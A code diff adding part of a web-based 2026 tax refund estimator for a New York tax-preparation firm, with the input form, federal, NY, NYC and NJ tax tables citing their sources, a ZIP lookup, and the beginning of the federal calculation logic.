+      <div><label>Zip *</label><input type="text" id="zip" data-v="zip" maxlength="10" inputmode="numeric" placeholder="11230"><div class="fldmsg"></div></div>
+    </div>
+    <div class="row"><div><label>Email *</label><input type="email" id="email" data-v="email" placeholder="dcohen@email.com"><div class="fldmsg"></div></div></div>
+    <div class="row r2">
+      <div><label>Home phone</label><input type="tel" id="phoneHome" data-v="phoneOpt" maxlength="12" placeholder="718-555-0142"><div class="fldmsg"></div></div>
+      <div><label>Mobile phone *</label><input type="tel" id="phoneMobile" data-v="phone" maxlength="12" placeholder="347-555-0198"><div class="fldmsg"></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <label class="chk"><input type="checkbox" id="incBenefit">
+      <span>Include employer-paid childcare benefit
+      <small>Adds the §129 comparison and the cost breakdown. Leave off for a standard refund estimate.</small></span></label>
+
+    <h2>Filing status &amp; residency</h2>
+    <div class="seg" id="segStatus">
+      <button data-v="mfj" class="on">Married</button>
+      <button data-v="single">Single</button>
+      <button data-v="hoh">Head of household</button>
+      <button data-v="mfs">Married separate</button>
+    </div>
+    <div class="seg" id="segState">
+      <button data-v="NY" class="on">New York</button>
+      <button data-v="NJ">New Jersey</button>
+    </div>
+    <label class="chk" id="nycRow"><input type="checkbox" id="nycRes" checked>
+      <span>New York City resident</span></label>
+    <div class="row r2">
+      <div><label>Taxpayer age 65+</label><input type="checkbox" id="tp65" style="width:auto"></div>
+      <div id="sp65Row"><label>Spouse age 65+</label><input type="checkbox" id="sp65" style="width:auto"></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>Income</h2>
+    <div id="totalBox">
+      <div class="tl"><label>Total household income</label>
+        <button class="lockbtn" id="lockBtn" type="button">Unlocked</button></div>
+      <input type="text" class="money" id="totalIncome" value="25,500" disabled>
+      <div id="totalHint">Adds up the boxes below. Lock it to type a total instead — the
+        first $7,500 goes to the spouse and the rest to the taxpayer, and the boxes stay
+        balanced as you adjust them.</div>
+    </div>
+    <div class="row r2">
+      <div><label>Taxpayer W-2 wages</label><input type="text" class="money inc" id="wagesTP" value="18,000"></div>
+      <div id="spWageRow"><label>Spouse W-2 wages</label><input type="text" class="money inc" id="wagesSP" value="7,500"></div>
+    </div>
+    <div class="row r2">
+      <div><label>Taxpayer 1099-NEC (max $140,000)</label><input type="text" class="money inc" id="necTP" value="0"></div>
+      <div id="spNecRow"><label>Spouse 1099-NEC (max $140,000)</label><input type="text" class="money inc" id="necSP" value="0"></div>
+    </div>
+    <div class="row r2">
+      <div><label>Taxpayer business expenses</label><input type="text" class="money" id="expTP" value="0"></div>
+      <div id="spExpRow"><label>Spouse business expenses</label><input type="text" class="money" id="expSP" value="0"></div>
+    </div>
+    <div class="row r2">
+      <div><label>Pre-tax deferrals (401k, HSA, IRA)</label><input type="text" class="money" id="pretax" value="0"></div>
+      <div><label>Investment income (interest, dividends)</label><input type="text" class="money" id="investInc" value="0"></div>
+    </div>
+    <div id="benefitRow" style="display:none">
+      <div class="row"><div><label>Annual employer childcare benefit</label>
+        <input type="text" class="money" id="benefit" value="24,000"></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>Tax withheld</h2>
+    <div class="row r3">
+      <div><label>Federal (W-2 box 2)</label><input type="text" class="money" id="whFed" value="0"></div>
+      <div><label>State (box 17)</label><input type="text" class="money" id="whState" value="0"></div>
+      <div><label>Local (box 19)</label><input type="text" class="money" id="whLocal" value="0"></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>Children</h2>
+    <div class="kidhdr"><span></span><span>Age</span><span>Child care expense paid</span><span></span><span></span></div>
+    <div id="kidList"></div>
+    <button class="addk" id="addKid">+ Add child</button>
+    <div class="note">Ages as of December 31, 2026. Maximum 12 children.<br>
+      We assume at least the maximum counted under the credit rules is paid —
+      $3,000 per child, up to $6,000 total.</div>
+  </div>
+
+  <div class="card noprint">
+    <h2>Save &amp; share</h2>
+    <div class="bar">
+      <button class="btn" id="btnSaveDraft">Save draft (PDF)</button>
+      <button class="btn alt" id="btnPrint">Print</button>
+      <button class="btn alt" id="btnEmail">Email</button>
+      <button class="btn warn" id="btnReset">Reset</button>
+    </div>
+    <div class="bar" style="margin-top:8px">
+      <button class="btn alt" id="btnStore">Save scenario</button>
+      <select id="scenPick" style="max-width:190px"><option value="">Load scenario…</option></select>
+      <button class="btn alt" id="btnExport">Export data</button>
+      <button class="btn alt" id="btnImport">Import data</button>
+      <input type="file" id="fileIn" accept=".json" style="display:none">
+    </div>
+    <div class="note" id="scenMsg"></div>
+  </div>
+
+</div>
+
+<div>
+  <div class="hero">
+    <div class="cap" id="heroCap">Estimated combined refund</div>
+    <div class="big" id="heroBig">$0</div>
+    <div class="sub" id="heroSub">Federal + state + city, after withholding and credits</div>
+    <div class="stats">
+      <div>Federal<b id="stFed">$0</b></div>
+      <div id="stStateWrap">State<b id="stState">$0</b></div>
+      <div id="stCityWrap">City<b id="stCity">$0</b></div>
+      <div id="stSeWrap">Self-employment tax<b id="stSe">$0</b></div>
+    </div>
+    <div class="disc" id="heroDisc"></div>
+  </div>
+
+  <div id="costBox" style="display:none">
+    <div>
+      <div class="ttl">Additional taxes this benefit will cost you</div>
+      <div class="amt" id="cbAmt">$0</div>
+      <div class="exp" id="cbExp"></div>
+    </div>
+    <div class="lines" id="cbLines"></div>
+  </div>
+
+  <div class="cmp" id="cmpWrap" style="display:none">
+    <div class="opt" id="optA" data-opt="exclusion">
+      <div class="pick"></div>
+      <div class="tag" id="tagA" style="display:none">Recommended</div>
+      <h3 id="optAh">Take $7,500 tax-free</h3>
+      <p id="optAtxt"></p>
+      <div class="amt" id="amtA">$0</div><div class="amtc">additional taxes</div>
+    </div>
+    <div class="opt" id="optB" data-opt="credit">
+      <div class="pick"></div>
+      <div class="tag" id="tagB" style="display:none">Recommended</div>
+      <h3>Claim the tax credit instead</h3>
+      <p>Your whole benefit is taxed like normal pay — but at tax time you claim the
+         childcare tax credit on what your employer paid toward care.</p>
+      <div class="amt" id="amtB">$0</div><div class="amtc">additional taxes</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>Detailed breakdown</h2>
+    <table id="bd"><tbody></tbody></table>
+  </div>
+
+  <div class="flag" id="flagBox" style="display:none"></div>
+
+  <div id="contactBlk">
+    <img src="logo.png" alt="2 File EZ Tax Returns" onerror="this.onerror=null;this.src=LOGO_FALLBACK">
+    <div class="sl">PERSONAL RETURNS ONLY · 100% FOCUSED ON YOU</div>
+    <div class="ci">
+      <b>Office</b> 929.345.3000  ·  <b>Cell</b> 347.234.5339<br>
+      <b>Fax</b> 855.234.5339<br>
+      <a href="mailto:taxreturn@2fileez.com">taxreturn@2fileez.com</a>
+    </div>
+  </div>
+</div>
+</div>
+
+<div id="printSheet">
+  <div id="psHero">
+    <div><div class="cap" id="psCap">Estimated combined refund</div>
+      <div class="big" id="psBig">$0</div></div>
+    <div class="r" id="psStats"></div>
+  </div>
+  <div id="psCost" style="display:none">
+    <div><div class="ttl">Additional taxes this benefit will cost you</div>
+      <div class="amt" id="psCbAmt">$0</div>
+      <div class="exp" id="psCbExp"></div></div>
+    <div id="psCbLines"></div>
+  </div>
+  <div id="psCmp" style="display:none"></div>
+  <div id="psGrid">
+    <div class="box"><h3>Prepared for</h3><div id="psClient"></div></div>
+    <div class="box"><h3>Return summary</h3><div id="psInputs"></div></div>
+  </div>
+  <div id="psBd"><table><tbody></tbody></table></div>
+  <div id="psFlag" style="display:none"></div>
+</div>
+
+<footer>
+  <div id="printFooter"><b>2 FILE EZ TAX RETURNS</b> · PERSONAL RETURNS ONLY · 100% FOCUSED ON YOU<br>
+  Office 929.345.3000 · Cell 347.234.5339 · Fax 855.234.5339 · taxreturn@2fileez.com</div>
+  <div style="margin-top:6px">Planning estimate only — not tax advice. Uses published 2026 federal,
+  New York State, New York City and New Jersey figures. Assumes full-year residency, wage and
+  self-employment income, the standard deduction, and valid Social Security numbers.
+  Confirm against the actual return before filing.</div>
+  <div id="copyright">© 2026 2 FILE EZ</div>
+</footer>
+</div>
+<script>
+/* ==========================================================================
+   2026 TAX DATA  —  every figure carries its source
+   2 File EZ Tax Returns  ·  Personal Returns Only
+   ========================================================================== */
+
+/* ---------- FEDERAL — IRS Rev. Proc. 2025-32 ---------- */
+
+const FED = {
+  // Rev. Proc. 2025-32, standard deduction for tax year 2026
+  stdDeduction: { single: 16100, mfj: 32200, mfs: 16100, hoh: 24150 },
+
+  // Rev. Proc. 2025-32, Sec. 2.01 rate tables. [lowerBound, rate]
+  brackets: {
+    single: [[0,.10],[12400,.12],[50400,.22],[105700,.24],[201775,.32],[256225,.35],[640600,.37]],
+    mfj:    [[0,.10],[24800,.12],[100800,.22],[211400,.24],[403550,.32],[512450,.35],[768700,.37]],
+    mfs:    [[0,.10],[12400,.12],[50400,.22],[105700,.24],[201775,.32],[256225,.35],[384350,.37]],
+    hoh:    [[0,.10],[17700,.12],[67450,.22],[105700,.24],[201775,.32],[256200,.35],[640600,.37]]
+  },
+
+  // FICA. SS wage base per SSA 2026 announcement.
+  ssWageBase: 184500,
+  ssRate: .062,
+  medicareRate: .0145,
+  addlMedicareRate: .009,
+  addlMedicareThreshold: { single:200000, hoh:200000, mfs:125000, mfj:250000 },
+
+  // SE tax: 92.35% of net profit is subject; half the SE tax is an above-line deduction
+  seNetFactor: .9235,
+
+  // Child Tax Credit — OBBBA P.L.119-21. $2,200/child under 17, indexed.
+  // Phase-out $50 per $1,000 of MAGI over threshold.
+  ctcPerChild: 2200,
+  ctcRefundableMax: 1700,          // ACTC cap — VERIFY against 2026 Sch 8812
+  ctcPhaseoutStart: { single:200000, hoh:200000, mfs:200000, mfj:400000 },
+  ctcEarnedIncomeFloor: 2500,
+  ctcRefundableRate: .15,
+
+  // §21 Child & Dependent Care Credit as amended by OBBBA §70404, effective 2026.
+  // 50% top rate, phasing to 35% then a 20% floor. Separate thresholds by status.
+  cdcc: {
+    expenseCap: { one: 3000, twoPlus: 6000 },
+    topRate: .50,
+    midRate: .35,
+    floorRate: .20,
+    // first phase-down begins; 1 point per $2,000 from 50% to 35%
+    phase1Start: { single:75000, hoh:75000, mfs:75000, mfj:150000 },
+    // second phase-down begins; 1 point per $2,000 from 35% to 20%
+    phase2Start: { single:103000, hoh:103000, mfs:103000, mfj:206000 }
+  },
+
+  // §129 Dependent Care Assistance Program — 26 U.S.C. §129 as amended by
+  // OBBBA. $7,500 ($3,750 MFS) for tax years beginning after 12/31/2025.
+  dcapExclusion: { single:7500, hoh:7500, mfj:7500, mfs:3750 },
+
+  // EITC — Rev. Proc. 2025-32.  *** FLAGGED FOR REVIEW PASS ***
+  // Structure is correct; the dollar parameters need confirmation against the
+  // published 2026 tables before any client return relies on them.
+  eitc: {
+    UNVERIFIED: true,
+    investmentIncomeLimit: 12200,
+    // [maxCredit, earnedIncomeAmt, phaseInRate, phaseoutBegin(single/hoh), phaseoutRate]
+    byChildren: {
+      0: { max: 700,   earned: 8650,  inRate: .0765, poBegin: 10850, poBeginMfj: 18100, outRate: .0765 },
+      1: { max: 4680,  earned: 12980, inRate: .34,   poBegin: 23800, poBeginMfj: 31050, outRate: .1598 },
+      2: { max: 7736,  earned: 18240, inRate: .40,   poBegin: 23800, poBeginMfj: 31050, outRate: .2106 },
+      3: { max: 8700,  earned: 18240, inRate: .45,   poBegin: 23800, poBeginMfj: 31050, outRate: .2106 }
+    }
+  }
+};
+
+/* ---------- NEW YORK STATE — Tax Law §601 (Ch.59 L.2025 Pt.A) + IT-2105-I (2026) ---------- */
+
+const NYS = {
+  // §601(a)(1)(B)(vii) / (b)(1)(B)(vii) / (c)(1)(B)(vii) — tax year 2026.
+  // Confirmed twice: statute and IT-2105-I page 10.
+  // [lowerBound, baseTax, rateOnExcess]
+  brackets: {
+    single: [[0,0,.0390],[8500,332,.0440],[11700,473,.0515],[13900,586,.0540],
+             [80650,4191,.0590],[215400,12141,.0685],[1077550,71198,.0965],
+             [5000000,449714,.1030],[25000000,2509714,.1090]],
+    mfs:    [[0,0,.0390],[8500,332,.0440],[11700,473,.0515],[13900,586,.0540],
+             [80650,4191,.0590],[215400,12141,.0685],[1077550,71198,.0965],
+             [5000000,449714,.1030],[25000000,2509714,.1090]],
+    mfj:    [[0,0,.0390],[17150,669,.0440],[23600,953,.0515],[27900,1174,.0540],
+             [161550,8391,.0590],[323200,17928,.0685],[2155350,143430,.0965],
+             [5000000,417939,.1030],[25000000,2477939,.1090]],
+    hoh:    [[0,0,.0390],[12800,499,.0440],[17650,712,.0515],[20900,879,.0540],
+             [107650,5564,.0590],[269300,15101,.0685],[1616450,107381,.0965],
+             [5000000,433894,.1030],[25000000,2493894,.1090]]
+  },
+
+  // IT-2105-I (2026) page 2, standard deduction table
+  stdDeduction: { single:8000, mfs:8000, mfj:16050, hoh:11200, dependent:3100 },
+  dependentExemption: 1000,   // IT-2105-I line 4
+
+  // §601(d-5) tax benefit recapture, tax year 2026.
+  // Confirmed twice: statute and IT-2105-I worksheets 1-16.
+  // Applies only when NYAGI > 107,650.
+  recaptureThreshold: 107650,
+  recapture: {
+    single: { flatRate: .0590, firstBandCeiling: 215400,
+      bands: [ {tiMin:80650,  tiMax:215400,   base:0,     incr:567,   agiRef:107650},
+               {tiMin:215400, tiMax:1077550,  base:567,   incr:2047,  agiRef:215400},
+               {tiMin:1077550,tiMax:5000000,  base:2614,  incr:30172, agiRef:1077550},
+               {tiMin:5000000,tiMax:25000000, base:32786, incr:32500, agiRef:5000000} ] },
+    mfs: { flatRate: .0590, firstBandCeiling: 215400,
+      bands: [ {tiMin:80650,  tiMax:215400,   base:0,     incr:567,   agiRef:107650},
+               {tiMin:215400, tiMax:1077550,  base:567,   incr:2047,  agiRef:215400},
+               {tiMin:1077550,tiMax:5000000,  base:2614,  incr:30172, agiRef:1077550},
+               {tiMin:5000000,tiMax:25000000, base:32786, incr:32500, agiRef:5000000} ] },
+    mfj: { flatRate: .0540, firstBandCeiling: 161550,
+      bands: [ {tiMin:27900,  tiMax:161550,   base:0,     incr:333,   agiRef:107650},
+               {tiMin:161550, tiMax:323200,   base:333,   incr:807,   agiRef:161550},
+               {tiMin:323200, tiMax:2155350,  base:1140,  incr:3071,  agiRef:323200},
+               {tiMin:2155350,tiMax:5000000,  base:4211,  incr:60350, agiRef:2155350},
+               {tiMin:5000000,tiMax:25000000, base:64561, incr:32500, agiRef:5000000} ] },
+    hoh: { flatRate: .0590, firstBandCeiling: 269300,
+      bands: [ {tiMin:107650, tiMax:269300,   base:0,     incr:787,   agiRef:107650},
+               {tiMin:269300, tiMax:1616450,  base:787,   incr:2559,  agiRef:269300},
+               {tiMin:1616450,tiMax:5000000,  base:3346,  incr:45260, agiRef:1616450},
+               {tiMin:5000000,tiMax:25000000, base:48606, incr:32500, agiRef:5000000} ] }
+  },
+
+  // IT-213 Empire State Child Credit. NY decoupled from the federal CTC for 2025.
+  // 2026 amounts per Ch.59 L.2025 Pt.C: $1,000 under 4; $500 age 4 through 16.
+  escc: {
+    under4: 1000,
+    age4to16: 500,
+    phaseoutStart: { mfj:110000, single:75000, hoh:75000, mfs:55000 },
+    reductionPer1000: 16.50
+  },
+
+  // IT-215. NYS EIC = 30% of federal EIC, reduced by the NYS household credit.
+  eicRate: .30,
+
+  // IT-216 Worksheet 1 — NY expense caps run higher than federal for 3+ children.
+  // NOTE: line 11 exclusion cap is $5,000 on the 2025 form. NY has NOT adopted
+  // the OBBBA $7,500. *** RE-CHECK when the 2026 IT-216 is published. ***
+  cdcc: {
+    expenseCapByCount: { 1:3000, 2:6000, 3:7500, 4:8500, 5:9000 },
+    exclusionCap: { standard: 5000, mfs: 2500 },
+    // IT-216-I line 10 decimal table, keyed to FAGI
+    rateTable: [[15000,.35],[17000,.34],[19000,.33],[21000,.32],[23000,.31],[25000,.30],
+                [27000,.29],[29000,.28],[31000,.27],[33000,.26],[35000,.25],[37000,.24],
+                [39000,.23],[41000,.22],[43000,.21],[Infinity,.20]]
+  }
+};
+
+// IT-216-I line 13 limitation multiplier, keyed to NYAGI, in $200 bands.
+// Transcribed from IT-216-I (2025) page 7.
+const NYS_CDCC_LIMIT_25_40 = [1.099,1.098,1.097,1.095,1.094,1.093,1.091,1.090,1.089,1.087,
+1.086,1.085,1.083,1.082,1.081,1.079,1.078,1.077,1.075,1.074,1.073,1.071,1.070,1.069,1.067,
+1.066,1.065,1.063,1.062,1.061,1.059,1.058,1.057,1.055,1.054,1.053,1.051,1.050,1.049,1.047,
+1.046,1.045,1.043,1.042,1.041,1.039,1.038,1.037,1.035,1.034,1.033,1.031,1.030,1.029,1.027,
+1.026,1.025,1.023,1.022,1.021,1.019,1.018,1.017,1.015,1.014,1.013,1.011,1.010,1.009,1.007,
+1.006,1.005,1.003,1.002,1.001];
+const NYS_CDCC_LIMIT_50_55 = [1.162,1.150,1.137,1.125,1.112,1.099,1.088,1.075,1.062,1.050,
+1.037,1.025,1.013,1.000,0.987,0.975,0.963,0.950,0.938,0.925,0.912,0.901,0.888,0.875,0.863];
+const NYS_CDCC_LIMIT_55_60 = [0.927,0.913,0.900,0.886,0.872,0.859,0.845,0.831,0.819,0.805,
+0.791,0.778,0.764,0.750,0.737,0.723,0.709,0.696,0.682,0.668,0.656,0.642,0.628,0.615,0.601];
+const NYS_CDCC_LIMIT_60_65 = [1.070,1.047,1.022,0.996,0.973,0.947,0.922,0.899,0.873,0.848,
+0.824,0.799,0.773,0.750,0.724,0.699,0.676,0.650,0.625,0.601,0.576,0.550,0.527,0.502,0.476];
+
+function nysCdccLimit(nyagi) {
+  if (nyagi <= 25000) return 1.100;
+  if (nyagi <= 40000) return NYS_CDCC_LIMIT_25_40[Math.min(74, Math.floor((nyagi-25000)/200))];
+  if (nyagi <= 50000) return 1.000;
+  if (nyagi <= 55000) return NYS_CDCC_LIMIT_50_55[Math.min(24, Math.floor((nyagi-50000)/200))];
+  if (nyagi <= 60000) return NYS_CDCC_LIMIT_55_60[Math.min(24, Math.floor((nyagi-55000)/200))];
+  if (nyagi <= 65000) return NYS_CDCC_LIMIT_60_65[Math.min(24, Math.floor((nyagi-60000)/200))];
+  if (nyagi <= 150000) return 0.600;
+  return 0.200;
+}
+
+/* ---------- NEW YORK CITY — IT-2105-I (2026) + IT-216-I / IT-215-I ---------- */
+
+const NYC = {
+  // IT-2105-I (2026) page 10. Unchanged from 2025 per NYS-50-T-NYC.
+  brackets: {
+    single: [[0,0,.03078],[12000,369,.03762],[25000,858,.03819],[50000,1813,.03876]],
+    mfs:    [[0,0,.03078],[12000,369,.03762],[25000,858,.03819],[50000,1813,.03876]],
+    mfj:    [[0,0,.03078],[21600,665,.03762],[45000,1545,.03819],[90000,3264,.03876]],
+    hoh:    [[0,0,.03078],[14400,443,.03762],[30000,1030,.03819],[60000,2176,.03876]]
+  },
+
+  // School tax credit — IT-2105-I (2026) page 8
+  stcFixed: { mfj:125, other:63 },
+  stcIncomeLimit: 250000,
+  stcRateReduction: {
+    mfj:    { threshold:21600, base:37, lowRate:.00171, highRate:.00228 },
+    single: { threshold:12000, base:21, lowRate:.00171, highRate:.00228 },
+    mfs:    { threshold:12000, base:21, lowRate:.00171, highRate:.00228 },
+    hoh:    { threshold:14400, base:25, lowRate:.00171, highRate:.00228 }
+  },
+  stcRateReductionCeiling: 500000,
+
+  // IT-215-I Worksheet C. 10%-30% of federal EIC by NYAGI.
+  // *** Tail above $42,500 not confirmed — 10% floor assumed. REVIEW PASS. ***
+  eicTable: [[5000,.30],[7500,.30],[15000,.25],[17500,.25],[20000,.20],
+             [22500,.20],[40000,.15],[42500,.15],[Infinity,.10]],
+  eicTailUnverified: true,
+
+  // IT-216 Worksheet 2 — NYC child care credit. Under 4 only, FAGI <= 30,000.
+  cdcc: { maxRate:.75, ageLimit:4, fagiLimit:30000 }
+};
+
+// NYC CDCC limitation, Worksheet 2 line 6. 0.750 to $25,000 then -0.030 per $200 band.
+function nycCdccLimit(fagi) {
+  if (fagi <= 25000) return 0.750;
+  if (fagi > 30000) return 0.000;
+  const step = Math.floor((fagi - 25000) / 200);
+  return Math.max(0, +(0.735 - step * 0.030).toFixed(3));
+}
+
+/* ---------- NEW JERSEY — NJ-1040 instructions + NJ Tax Rate Schedules ---------- */
+
+const NJ = {
+  // NJ Tax Rate Schedules, Tables A and B. Multiply-then-subtract format.
+  // [lowerBound, rate, subtract]
+  brackets: {
+    single: [[0,.014,0],[20000,.0175,70],[35000,.035,682.50],[40000,.05525,1492.50],
+             [75000,.0637,2126.25],[500000,.0897,15126.25],[1000000,.1075,32926.25]],
+    mfs:    [[0,.014,0],[20000,.0175,70],[35000,.035,682.50],[40000,.05525,1492.50],
+             [75000,.0637,2126.25],[500000,.0897,15126.25],[1000000,.1075,32926.25]],
+    mfj:    [[0,.014,0],[20000,.0175,70],[50000,.0245,420],[70000,.035,1154.50],
+             [80000,.05525,2775],[150000,.0637,4042.50],[500000,.0897,17042.50],
+             [1000000,.1075,34842.50]],
+    hoh:    [[0,.014,0],[20000,.0175,70],[50000,.0245,420],[70000,.035,1154.50],
+             [80000,.05525,2775],[150000,.0637,4042.50],[500000,.0897,17042.50],
+             [1000000,.1075,34842.50]]
+  },
+
+  // NJ-1040 instructions, Exemptions lines 6-12
+  exemption: { personal:1000, senior:1000, blindDisabled:1000, veteran:6000,
+               dependentChild:1500, otherDependent:1500, collegeDependent:1000 },
+
+  // NJ-1040 filing thresholds
+  filingThreshold: { single:10000, mfs:10000, mfj:20000, hoh:20000 },
+
+  // NJEITC — 40% of federal for 2025, per NJ Division of Taxation
+  eitcRate: .40,
+  eitcInvestmentLimit: 11950,
+  eitcMinAge: 18,          // NJ does not follow the federal age floor
+
+  // NJ Child Tax Credit — refundable, child age 5 or younger, taxable income <= 80,000
+  // *** Phase-out tiers need confirmation. REVIEW PASS. ***
+  ctc: {
+    UNVERIFIED_TIERS: true,
+    ageLimit: 5,
+    tiers: [[30000,1000],[40000,800],[50000,600],[60000,400],[70000,300],[80000,200]]
+  },
+
+  // NJ Child and Dependent Care Credit — % of federal credit, NJ taxable income
+  // <= 150,000, refundable, no maximum limitation (2021 amendments).
+  // *** Bands above $60,000 not confirmed. REVIEW PASS. ***
+  cdcc: {
+    UNVERIFIED_BANDS: true,
+    incomeLimit: 150000,
+    tiers: [[20000,.50],[30000,.40],[40000,.30],[50000,.20],[60000,.10],[150000,.10]]
+  },
+
+  // NJ does NOT conform to §129. Confirmed: NJ-1040 line 15 instructions and TAM 2011-14.
+  // §125 salary-reduction amounts are taxable NJ wages.
+  conformsToDcapExclusion: false
+};
+
+/* ---------- MCTMT guard ---------- */
+const SE_INCOME_CAP = 140000;   // per person; blocks above to avoid MCTMT territory
+
+/* ==========================================================================
+   ZIP -> CITY / STATE  (New York City, all five boroughs)
+   Queens entries are the USPS-assigned city names, which are neighbourhood
+   names rather than "Queens" — transcribed from the USPS ZIP directory.
+   Manhattan, the Bronx, Brooklyn and Staten Island use the borough name
+   uniformly, so those are stored as ranges.
+   Outside NYC the state still fills from the range table below; the city
+   is left for typing.
+   ========================================================================== */
+
+const QUEENS_ZIP_CITY = (function(){
+  const byCity = {
+    'Glen Oaks':[11004], 'Floral Park':[11005],
+    'Long Island City':[11101,11109,11120],
+    'Astoria':[11102,11103,11105,11106],
+    'Sunnyside':[11104],
+    'Flushing':[11351,11352,11354,11355,11358,11367,11371,11381],
+    'College Point':[11356], 'Whitestone':[11357],
+    'Bayside':[11359,11360,11361],
+    'Little Neck':[11362,11363],
+    'Oakland Gardens':[11364],
+    'Fresh Meadows':[11365,11366],
+    'Corona':[11368],
+    'East Elmhurst':[11369,11370],
+    'Jackson Heights':[11372],
+    'Elmhurst':[11373,11380],
+    'Rego Park':[11374], 'Forest Hills':[11375],
+    'Woodside':[11377], 'Maspeth':[11378], 'Middle Village':[11379],
+    'Ridgewood':[11385,11386],
+    'Cambria Heights':[11411], 'Saint Albans':[11412],
+    'Springfield Gardens':[11413], 'Howard Beach':[11414],
+    'Kew Gardens':[11415],
+    'Ozone Park':[11416,11417],
+    'Richmond Hill':[11418], 'South Richmond Hill':[11419],
+    'South Ozone Park':[11420], 'Woodhaven':[11421],
+    'Rosedale':[11422], 'Hollis':[11423], 'Bellerose':[11426],
+    'Queens Village':[11427,11428,11429],
+    'Jamaica':[11405,11424,11425,11430,11431,11432,11433,11434,11435,
+               11436,11437,11439,11451,11499],
+    'Far Rockaway':[11690,11691,11693,11695],
+    'Arverne':[11692], 'Rockaway Park':[11694], 'Breezy Point':[11697]
+  };
+  const m = {};
+  for (const city in byCity) byCity[city].forEach(function(z){ m[z] = city; });
+  return m;
+})();
+
+// [low, high, city]  — boroughs where USPS uses one name throughout
+const NYC_ZIP_CITY_RANGES = [
+  [10001,10282,'New York'],        // Manhattan
+  [10301,10314,'Staten Island'],
+  [10451,10475,'Bronx'],
+  [11201,11256,'Brooklyn']
+];
+
+function zipToCity(zip){
+  const n = parseInt(String(zip).slice(0,5), 10);
+  if (isNaN(n)) return null;
+  if (QUEENS_ZIP_CITY[n]) return QUEENS_ZIP_CITY[n];
+  for (let i=0;i<NYC_ZIP_CITY_RANGES.length;i++){
+    const r = NYC_ZIP_CITY_RANGES[i];
+    if (n >= r[0] && n <= r[1]) return r[2];
+  }
+  return null;                      // outside NYC — leave the city to typing
+}
+
+/* ==========================================================================
+   CALCULATION ENGINE
+   ========================================================================== */
+
+const r0 = n => Math.round(n || 0);
+const pos = n => Math.max(0, n || 0);
+
+/* ---- generic bracket helpers ---- */
+
+function taxFromMarginal(income, brackets) {   // federal style [lower, rate]
+  let t = 0;
+  for (let i = 0; i < brackets.length; i++) {
+    const lo = brackets[i][0];
+    const hi = i + 1 < brackets.length ? brackets[i + 1][0] : Infinity;
+    if (income > lo) t += (Math.min(income, hi) - lo) * brackets[i][1];
+  }
+  return t;
+}
+
+function taxFromBaseTable(income, brackets) {  // NY style [lower, base, rate]
+  let row = brackets[0];
+  for (const b of brackets) if (income > b[0]) row = b;
+  return row[1] + (income - row[0]) * row[2];
+}
+
+function taxFromSubtractTable(income, brackets) {  // NJ style [lower, rate, subtract]
+  let row = brackets[0];
+  for (const b of brackets) if (income > b[0]) row = b;
+  return pos(income * row[1] - row[2]);
+}
+
+/* ---- FEDERAL ---- */
+
+function calcFederal(D) {
+  const st = D.status;
+
+  // Wages. When the employer childcare benefit is in play, the excluded portion
+  // stays out of Box 1; anything above the exclusion is wages.
+  const wages = D.wagesTP + D.wagesSP;
+  const seProfit = pos(D.necTP - D.expTP) + pos(D.necSP - D.expSP);
+
+  // §129 exclusion, capped by the LOWER-earning spouse's earned income
+  let exclusion = 0, benefitTaxable = 0;
+  if (D.includeBenefit && D.benefit > 0) {
+    const cap = FED.dcapExclusion[st];
+    const earnTP = D.wagesTP + pos(D.necTP - D.expTP);
+    const earnSP = D.wagesSP + pos(D.necSP - D.expSP);
+    const earnedLimit = (st === 'mfj')
+      ? Math.min(earnTP, D.spouseStudentDisabled ? Infinity : earnSP)
+      : earnTP;
+    exclusion = D.takeExclusion ? Math.min(cap, D.benefit, pos(earnedLimit)) : 0;
+    benefitTaxable = D.benefit - exclusion;
+  }
+
+  const seTaxBase = seProfit * FED.seNetFactor;
+  const ssApplied = Math.min(pos(seTaxBase), pos(FED.ssWageBase - wages));
+  const seTax = ssApplied * .124 + pos(seTaxBase) * .029
+              + pos(seTaxBase + wages - FED.addlMedicareThreshold[st]) * FED.addlMedicareRate;
+  const seDeduction = (ssApplied * .124 + pos(seTaxBase) * .029) / 2;
+
+  // Employee-side FICA attributable to the TAXABLE portion of the childcare
+  // benefit. Excluded amounts are outside boxes 3 and 5, so they bear no FICA.
+  // This is the delta the benefit causes, not total payroll tax.
+  const ssRoomAfterWages = pos(FED.ssWageBase - wages);
+  const addlFica =
+      Math.min(benefitTaxable, ssRoomAfterWages) * FED.ssRate
+    + benefitTaxable * FED.medicareRate
+    + pos(wages + benefitTaxable - FED.addlMedicareThreshold[st]) * FED.addlMedicareRate
+    - pos(wages - FED.addlMedicareThreshold[st]) * FED.addlMedicareRate;
+
+  const grossIncome = wages + benefitTaxable + seProfit;
+  const agi = pos(grossIncome - seDeduction - D.pretax);
+
+  const deduction = FED.stdDeduction[st];
+  const taxable = pos(agi - deduction);
+  const taxBefore = taxFromMarginal(taxable, FED.brackets[st]);
+
+  // --- Child & Dependent Care Credit, Form 2441 ---
+  // Per IRS Pub 503 the dollar limit follows the qualifying persons for whom
+  // expenses were actually PAID — a qualifying person with $0 of care does not
+  // raise the cap.
+  const cdccKids = D.children.filter(c => c.age < 13 && (c.care||0) > 0);
+  const cdccCount = cdccKids.length;
+  const paidForCdcc = cdccKids.reduce((s,c) => s + (c.care||0), 0);
+  let cdcc = 0, cdccBase = 0, cdccRate = 0;
+  if (cdccCount > 0) {
+    const cap = cdccCount === 1 ? FED.cdcc.expenseCap.one : FED.cdcc.expenseCap.twoPlus;
+    // Form 2441 lines 27-31: cap reduced dollar-for-dollar by EXCLUDED benefits
+    cdccBase = Math.min(paidForCdcc, pos(cap - exclusion));
+    const earnTP = D.wagesTP + pos(D.necTP - D.expTP);
+    const earnSP = st === 'mfj' ? (D.spouseStudentDisabled ? 999999 : D.wagesSP + pos(D.necSP - D.expSP)) : Infinity;
+    cdccBase = Math.min(cdccBase, earnTP, earnSP);
+    cdccRate = fedCdccRate(agi, st);
+    cdcc = Math.min(cdccBase * cdccRate, taxBefore);   // nonrefundable
+  }
+
+  // --- Child Tax Credit ---
+  const ctcKids = D.children.filter(c => c.age < 17).length;
+  let ctcFull = ctcKids * FED.ctcPerChild;
+  const over = pos(agi - FED.ctcPhaseoutStart[st]);
+  if (over > 0) ctcFull = pos(ctcFull - Math.ceil(over / 1000) * 50);
+  const afterCdcc = pos(taxBefore - cdcc);
